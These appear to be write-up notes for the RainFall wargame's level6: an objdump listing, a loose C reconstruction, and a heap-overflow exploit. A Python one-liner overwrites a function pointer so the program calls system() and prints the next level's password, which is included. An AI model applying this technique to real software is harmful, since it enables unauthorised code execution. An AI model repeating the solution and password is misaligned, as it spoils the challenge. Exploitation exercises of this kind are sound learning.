## level6 TODO NOTES
Below is the objdump for level6
```
08048454 <n>:
 8048454:       55                      push   ebp
 8048455:       89 e5                   mov    ebp,esp
 8048457:       83 ec 18                sub    esp,0x18
 804845a:       c7 04 24 b0 85 04 08    mov    DWORD PTR [esp],0x80485b0
 8048461:       e8 0a ff ff ff          call   8048370 <system@plt>
 8048466:       c9                      leave
 8048467:       c3                      ret

08048468 <m>:
 8048468:       55                      push   ebp
 8048469:       89 e5                   mov    ebp,esp
 804846b:       83 ec 18                sub    esp,0x18
 804846e:       c7 04 24 d1 85 04 08    mov    DWORD PTR [esp],0x80485d1
 8048475:       e8 e6 fe ff ff          call   8048360 <puts@plt>
 804847a:       c9                      leave
 804847b:       c3                      ret

0804847c <main>:
 804847c:       55                      push   ebp
 804847d:       89 e5                   mov    ebp,esp
 804847f:       83 e4 f0                and    esp,0xfffffff0
 8048482:       83 ec 20                sub    esp,0x20
 8048485:       c7 04 24 40 00 00 00    mov    DWORD PTR [esp],0x40
 804848c:       e8 bf fe ff ff          call   8048350 <malloc@plt>
 8048491:       89 44 24 1c             mov    DWORD PTR [esp+0x1c],eax
 8048495:       c7 04 24 04 00 00 00    mov    DWORD PTR [esp],0x4
 804849c:       e8 af fe ff ff          call   8048350 <malloc@plt>
 80484a1:       89 44 24 18             mov    DWORD PTR [esp+0x18],eax
 80484a5:       ba 68 84 04 08          mov    edx,0x8048468
 80484aa:       8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
 80484ae:       89 10                   mov    DWORD PTR [eax],edx
 80484b0:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 80484b3:       83 c0 04                add    eax,0x4
 80484b6:       8b 00                   mov    eax,DWORD PTR [eax]
 80484b8:       89 c2                   mov    edx,eax
 80484ba:       8b 44 24 1c             mov    eax,DWORD PTR [esp+0x1c]
 80484be:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 80484c2:       89 04 24                mov    DWORD PTR [esp],eax
 80484c5:       e8 76 fe ff ff          call   8048340 <strcpy@plt>
 80484ca:       8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
 80484ce:       8b 00                   mov    eax,DWORD PTR [eax]
 80484d0:       ff d0                   call   eax
 80484d2:       c9                      leave
 80484d3:       c3                      ret
 80484d4:       90                      nop
 80484d5:       90                      nop
 80484d6:       90                      nop
 80484d7:       90                      nop
 80484d8:       90                      nop
 80484d9:       90                      nop
 80484da:       90                      nop
 80484db:       90                      nop
 80484dc:       90                      nop
 80484dd:       90                      nop
 80484de:       90                      nop
 80484df:       90                      nop
 ```
Looking at the object jump, the code looks something like this
```clike=
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// 08048454
void    n()
{
	system("/bin/cat /home/user/level7/.pass");
}

// 08048468
void    m()
{
	puts("Nope");
}

int main()
{
    // 8048482
    char *ptr1;
    void* fn_ptr;
    
    // 804848c
    ptr1 = malloc(64);
    
    // 804849c
    fn_ptr = malloc(4);
    
    // 80484a5 - 80484ae
    *fn_ptr = m;
    
    // 80484ba - 80484c5
    strcpy(ptr1, argv[1]);
    
    // 80484ce - 80484d0
    (*fn_ptr)();
}
```
Looks like we have a heap overflow vulnerability here. Heap overflow mechanics work silimar to stack overflows, except that they are **iverted and have space between elements**. The procesure will be similar, we will execute the following steps:
1. Find how many characters we need to input to overwrite fn_ptr
2. Once offset is found, append the function address of n()

For the first step, I generated my input using the script `python -c "print 'B' * 73"`, which goves me the offset. I also learnt to do direct derefrencing using ` x/10x  *(int *)($esp+0x18)` to validate results
![image](https://hackmd.io/_uploads/H10TMUiHa.png)

The offset is 72, now I will append the address in my input to overwrite the function pointer with value `08048454`. `python -c "print 'B' * 72 + '\x08\x04\x84\x54'[::-1]"`. The password is `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`

```
level6@RainFall:~$ ./level6 `python -c "print 'B' * 72 + '\x08\x04\x84\x54'[::-1]"`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
level6@RainFall:~$
```

